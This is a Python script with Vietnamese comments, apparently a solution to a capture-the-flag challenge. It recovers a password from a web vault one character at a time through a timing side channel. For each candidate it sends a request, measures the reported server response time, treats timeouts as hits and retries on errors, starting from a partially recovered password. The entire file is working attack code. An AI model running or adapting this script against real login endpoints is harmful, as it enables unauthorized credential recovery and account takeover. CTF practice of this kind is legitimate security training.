import requests
import re
import string
import time

URL = "http://vault.secso.cc/"
CHARSET = string.ascii_letters + string.digits + "{}_"

# TIẾP TỤC TỪ ĐÂY!
password = "H8iObjIcSr"

# Cập nhật thời gian cơ sở dựa trên log mới nhất của bạn.
known_max_time = len(password) * 100
TIME_JUMP_THRESHOLD = 50

found = False

print(f"Bắt đầu tấn công 'Lì Lợm' từ: '{password}'...")

while not found:
    best_char = ""
    max_time_in_loop = known_max_time 
    
    # Cờ để báo hiệu cho vòng lặp for bên ngoài rằng đã tìm thấy ký tự và có thể ngắt
    char_found_and_break = False

    for char in CHARSET:
        payload = password + char
        params = {'password': payload}
        
        # --- LOGIC RETRY MỚI ---
        request_successful = False
        while not request_successful: # Lặp lại cho đến khi request thành công
            try:
                response = requests.get(URL, params=params, timeout=10)
                match = re.search(r"Response time: ([\d.]+) ms", response.text)
                
                if match:
                    duration = float(match.group(1))
                    print(f"[*] Đang thử: '{payload}' -> Thời gian server: {duration:.2f}ms")

                    if duration > known_max_time + TIME_JUMP_THRESHOLD:
                        print(f"[!] Tối ưu hóa: Tìm thấy ký tự '{char}' với thời gian vượt trội. Chốt luôn!")
                        best_char = char
                        max_time_in_loop = duration
                        char_found_and_break = True # Đặt cờ để thoát vòng lặp for
                        
                    elif duration > max_time_in_loop:
                        max_time_in_loop = duration
                        best_char = char
                else:
                    # Đôi khi server trả về HTML không có thời gian, cũng cần thử lại
                    print(f"[?] Server trả về response không hợp lệ cho '{payload}'. Đang thử lại...")
                    time.sleep(3)
                    continue # Quay lại đầu vòng lặp while để thử lại

                request_successful = True # Đánh dấu request thành công để thoát vòng lặp while

            except requests.exceptions.ReadTimeout:
                print(f"[*] Request cho '{payload}' bị TIMEOUT. Đây chắc chắn là ký tự đúng!")
                best_char = char
                max_time_in_loop = known_max_time + 10000 
                char_found_and_break = True
                request_successful = True # Coi như thành công và thoát
            
            except requests.exceptions.RequestException as e:
                print(f"[!] Lỗi kết nối cho '{payload}'. Sẽ thử lại sau 3 giây...")
                time.sleep(3) # Nghỉ 3 giây rồi vòng lặp while sẽ tự động thử lại

        # --- KẾT THÚC LOGIC RETRY ---

        if char_found_and_break:
            break # Thoát vòng lặp for vì đã tìm thấy ký tự bằng tối ưu hóa

        # Chỉ nghỉ khi request thành công để tránh làm chậm thêm khi đang bị lỗi
        time.sleep(0.1)

    if best_char and max_time_in_loop > known_max_time:
        password += best_char
        known_max_time = max_time_in_loop
        print(f"\n[+] Tìm thấy ký tự mới: '{best_char}'")
        print(f"[+] Mật khẩu hiện tại: {password}\n")
    else:
        print("[!] Không tìm thấy ký tự mới nào có thời gian lớn hơn.")
        print("[!] Mật khẩu đã hoàn chỉnh!")
        found = True

print(f"\n[SUCCESS] Tìm thấy mật khẩu hoàn chỉnh: {password}")
print("Hãy thử submit mật khẩu này lên trang web!")